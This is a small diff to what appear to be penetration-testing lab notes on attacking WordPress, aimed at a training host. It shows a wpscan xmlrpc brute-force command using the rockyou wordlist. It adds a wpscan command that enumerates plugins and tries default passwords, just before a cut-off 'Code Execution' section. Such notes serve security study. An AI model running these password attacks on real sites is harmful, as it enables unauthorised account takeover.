@@ -20,6 +20,10 @@ The `wp-login` method will attempt to brute force the standard WordPress login p
 wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 ```
 
+```
+wpscan --url http://blog.inlanefreight.local/ --enumerate ap --passwords '/usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt' 
+```
+
 ### Code Execution
 
 ```
